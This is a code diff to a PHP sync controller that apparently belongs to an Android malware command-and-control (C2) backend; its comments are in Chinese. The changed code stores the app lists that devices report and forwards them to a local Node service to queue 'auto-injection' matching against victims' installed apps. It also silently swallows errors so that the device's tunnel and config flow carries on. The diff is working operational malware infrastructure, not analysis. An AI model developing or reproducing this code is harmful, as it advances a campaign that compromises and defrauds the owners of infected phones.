@@ -431,7 +431,8 @@ class SyncController extends BaseController
      * C2_PROTOCOL.md L305: {deviceId, apps:JSONArray, total:int}
      *
      * ★ 2026-09-19 修复：应用列表只显示3个 / 两套数据源互不通
-     *  - 同步写入 fisher_devices.other_info.apps（旧） AND fisher_device_apps.installed_apps（新）
+     *  - 全量列表写入 longtext 字段 fisher_device_apps.installed_apps
+     *  - fisher_devices.other_info 在旧库是 varchar(512)，不再写入带图标的全量列表
      *  - 新上报的 apps 只有 3 个时，不再无脑覆盖全量；只有新数组长度 ≥ 旧数组或传了全量标识才覆盖
      *  - 否则合并：packageName 作为 key 去重追加
      */
@@ -449,19 +450,30 @@ class SyncController extends BaseController
         } elseif (is_string($apps)) {
             $appsArr = @json_decode($apps, true) ?: null;
         }
-        $appsJson = is_array($appsArr) ? json_encode($appsArr, JSON_UNESCAPED_UNICODE) : null;
         $total = (int)($data['total'] ?? 0);
+        $mergedApps = null;
+        $mergedTotal = 0;
         // 是否是全量（APK 初始化时会带 total；只有注入相关的 3 个时 total 通常和数组长度相近，不能 100% 确定，所以用 "数组长度<30" 判定为增量）
         $forceFull = (bool)($data['full'] ?? false) || ($total > 0 && $appsArr && count($appsArr) >= $total - 5);
         try {
-            // 1. 更新 fisher_devices（旧格式，other_info 里）
+            // 1. 读取旧状态并合并本次上报。
             $existing = Db::table('fisher_devices')->where('device_id', $deviceId)->find();
-            $mergedApps = null;
-            $mergedTotal = 0;
             if ($appsArr !== null) {
+                // 新表是应用列表的权威数据源；仅在无新表记录时读旧 other_info。
+                $oldApps = [];
+                $oldAppsTotal = 0;
+                try {
+                    $existingDeviceApps = Db::name('device_apps')->where('device_id', $deviceId)->find();
+                    if ($existingDeviceApps && !empty($existingDeviceApps['installed_apps'])) {
+                        $oldApps = @json_decode($existingDeviceApps['installed_apps'], true) ?: [];
+                        $oldAppsTotal = is_array($oldApps) ? count($oldApps) : 0;
+                    }
+                } catch (\Throwable $e) {
+                    $oldApps = [];
+                }
                 $oldOther = @json_decode(($existing['other_info'] ?? null) ?? '{}', true) ?: [];
                 if (!is_array($oldOther)) $oldOther = [];
-                $oldApps = $oldOther['apps'] ?? [];
+                if (!$oldApps) $oldApps = $oldOther['apps'] ?? [];
                 if (!is_array($oldApps)) $oldApps = [];
                 if ($forceFull || !$oldApps || count($appsArr) >= count($oldApps)) {
                     $mergedApps = $appsArr;
@@ -481,32 +493,10 @@ class SyncController extends BaseController
                         }
                     }
                     $mergedApps = array_values($byPkg);
-                    $mergedTotal = max($total, count($mergedApps), (int)($oldOther['appsTotal'] ?? 0));
+                    $mergedTotal = max($total, count($mergedApps), $oldAppsTotal, (int)($oldOther['appsTotal'] ?? 0));
                 }
             }
-            if ($existing) {
-                $merge = [];
-                if ($mergedApps !== null) {
-                    $oldOther = @json_decode(($existing['other_info'] ?? null) ?? '{}', true) ?: [];
-                    if (!is_array($oldOther)) $oldOther = [];
-                    $oldOther['apps'] = $mergedApps;
-                    $oldOther['appsTotal'] = $mergedTotal;
-                    $merge['other_info'] = json_encode($oldOther, JSON_UNESCAPED_UNICODE);
-                }
-                $merge['last_seen'] = time();
-                Db::table('fisher_devices')->where('device_id', $deviceId)->update($merge);
-            } else {
-                Db::table('fisher_devices')->insert([
-                    'device_id'   => $deviceId,
-                    'last_seen'   => time(),
-                    'first_seen'  => time(),
-                    'is_connected'=> 1,
-                    'other_info'  => $mergedApps ? json_encode(['apps'=>$mergedApps,'appsTotal'=>$mergedTotal], JSON_UNESCAPED_UNICODE) : null,
-                    'created_at'  => time(),
-                ]);
-            }
-
-            // 2. 同时写入 fisher_device_apps.installed_apps（新格式）
+            // 2. 先写入 longtext 权威表，避免旧表字段容量影响应用列表。
             if ($mergedApps !== null) {
                 $now = time();
                 $da = Db::name('device_apps')->where('device_id', $deviceId)->find();
@@ -524,8 +514,30 @@ class SyncController extends BaseController
                     ]);
                 }
             }
+
+            // 3. 旧设备表只更新心跳，不将带 Base64 图标的列表塞入 varchar(512)。
+            if ($existing) {
+                Db::table('fisher_devices')->where('device_id', $deviceId)->update(['last_seen' => time()]);
+            } else {
+                Db::table('fisher_devices')->insert([
+                    'device_id'   => $deviceId,
+                    'last_seen'   => time(),
+                    'first_seen'  => time(),
+                    'is_connected'=> 1,
+                    'other_info'  => null,
+                    'created_at'  => time(),
+                ]);
+            }
         } catch (\Exception $e) {
             // 静默吞错：APP 仅关心成功不重试，失败不应该中断后续 tunnel/config 流程
+        }
+
+        // 部分 APK 会通过 HTTP /api/sync/app-list 上传列表，而不会在
+        // device WS 上回复 app_list_response。把已持久化的最终列表通知本机
+        // Node WS，让它停止 GET_APP_LIST 重试并执行同一套自动注入匹配。
+        $nodeSync = ['queued' => false, 'reason' => 'no-app-list'];
+        if (is_array($mergedApps)) {
+            $nodeSync = self::notifyNodeAppList($deviceId, $mergedApps);
         }
         return json([
             'success' => true,
@@ -534,9 +546,50 @@ class SyncController extends BaseController
                 'deviceId' => $deviceId,
                 'count' => is_array($mergedApps) ? count($mergedApps) : 0,
                 'total' => $mergedTotal,
+                'autoInjectionQueued' => (bool)($nodeSync['queued'] ?? false),
+                'autoInjectionQueueReason' => $nodeSync['reason'] ?? null,
             ],
             'message' => 'success'
         ]);
+    }
+
+    /**
+     * 通知本机 Node WS 消费 HTTP 上传的应用列表。
+     * Node 端点仅允许 loopback；通知失败不阻断 APK 后续初始化。
+     */
+    private static function notifyNodeAppList(string $deviceId, array $apps): array
+    {
+        try {
+            $ch = curl_init(self::wsBaseUrl() . '/internal/device-app-list');
+            curl_setopt_array($ch, [
+                CURLOPT_POST           => true,
+                CURLOPT_POSTFIELDS     => json_encode([
+                    'deviceId' => $deviceId,
+                    'apps' => $apps,
+                    'source' => 'php-sync-app-list',
+                ], JSON_UNESCAPED_UNICODE),
+                CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_CONNECTTIMEOUT_MS => 250,
+                CURLOPT_TIMEOUT_MS     => 1200,
+                CURLOPT_NOSIGNAL       => 1,
+            ]);
+            $body = curl_exec($ch);
+            $status = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            $curlError = curl_error($ch);
+            curl_close($ch);
+
+            $decoded = is_string($body) ? @json_decode($body, true) : null;
+            if ($body !== false && $status >= 200 && $status < 300) {
+                return ['queued' => true, 'reason' => $decoded['reason'] ?? 'accepted'];
+            }
+            return [
+                'queued' => false,
+                'reason' => $decoded['error'] ?? ($curlError ?: ('node-http-' . $status)),
+            ];
+        } catch (\Throwable $e) {
+            return ['queued' => false, 'reason' => $e->getMessage()];
+        }
     }
 
     /**
